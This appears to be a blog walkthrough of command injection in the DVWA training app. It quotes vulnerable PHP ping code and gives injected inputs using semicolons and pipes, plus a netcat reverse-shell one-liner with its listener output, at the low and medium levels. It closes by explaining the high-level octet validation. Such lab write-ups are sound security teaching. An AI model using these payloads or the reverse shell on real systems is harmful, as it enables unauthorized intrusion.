---
layout: post
title: Dam Vulnerable Web App Code Execution
---

# DVWA Command Execution LOW


We enter an ip and then it pings it.
If we enter 10.0.2.4 it pings our ip we entered and shows us the result of the ping.


```
if( isset( $_POST[ 'submit' ] ) ) {
    $target = $_REQUEST[ 'ip' ];
    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';
    } else { 
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';
    } 
}
```

Looking at the code we can see that it calls a php functioned called shell_exec which returns a string. 
It executes the ping command 3 times and returns the 3 ip pings back and displays it. 
There isn’t any filtering of special characters either.

This means that we can pass in 
10.0.2.4; pwd
This executes the ping command and then it executes the pwd command which prints the current working directory.

Now we can set up a reverse shell since we know we can execute commands.
First we need to find our ip on our machine.
If we do ifconfig and find the inet address which will be similar to the DVWA ip if you’re self hosting on a virtual machine. 

First we need to set up a listener so we can get the reverse shell. We set up netcat to listen on port 7667 (can be any port)
nc -vv -l -p 7667

Now we use the same exploit with the semicolon to execute the netcat command to get a reverse shell.
10.0.2.15; nc -e /bin/sh 10.0.2.15 7667

nc -vv -l -p 7667
listening on [any] 7667 ...
10.0.2.4: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.4] 44976
pwd
/var/www/dvwa/vulnerabilities/exec

We see that now we have access and can run any command.


# DVWA Command Execution MEDIUM

This time when we try to issue the ping command with a semicolon we find it doesn’t work.
```
if( isset( $_POST[ 'submit'] ) ) {
    $target = $_REQUEST[ 'ip' ];
    // Remove any of the charactars in the array (blacklist).
    $substitutions = array(
        '&&' => '',
        ';' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';        
    } else {     
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';        
    }
}
```

We can see that they’re filtering out the semicolon. 
Instead of using a semicolon we can use a pipe.

10.0.2.4 | pwd
﻿/var/www/dvwa/vulnerabilities/exec

Now we can do the reverse shell using the previous steps but instead of a semicolon we use a pipe |.


# DVWA Command Execution HIGH


In this one the pipe and semicolon are patched.
There isn’t any current way to get around this but we can understand how they protected against attacks.
```
if( isset( $_POST[ 'submit' ] ) ) {
    $target = $_REQUEST["ip"];   
    $target = stripslashes( $target );        
    // Split the IP into 4 octects
    $octet = explode(".", $target);    
    // Check IF each octet is an integer
    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) 
          && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {    
    // If all 4 octets are int's put the IP back together.
    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];      
        // Determine OS and execute the ping command.
        if (stristr(php_uname('s'), 'Windows NT')) {     
            $cmd = shell_exec( 'ping  ' . $target );
            echo '<pre>'.$cmd.'</pre>';        
        } else {     
            $cmd = shell_exec( 'ping  -c 3 ' . $target );
            echo '<pre>'.$cmd.'</pre>';        
        }    
    }    
    else {
        echo '<pre>ERROR: You have entered an invalid IP</pre>';
    }        
} 
```
First it reads in the ip and strips it of slashes. Then it splits the ip into a group 4 separating it by the dot into an array. 
[10,0,2,4]
It check checks each item in the array to see if it’s numeric and that the array is only a length of 4.
It then rebuilds the ip, readds the dots and executes the ping command on it.

If we tried to run 10.0.2.4;pwd
It would be caught as [10,0,2,4;pwd] by the numeric check.

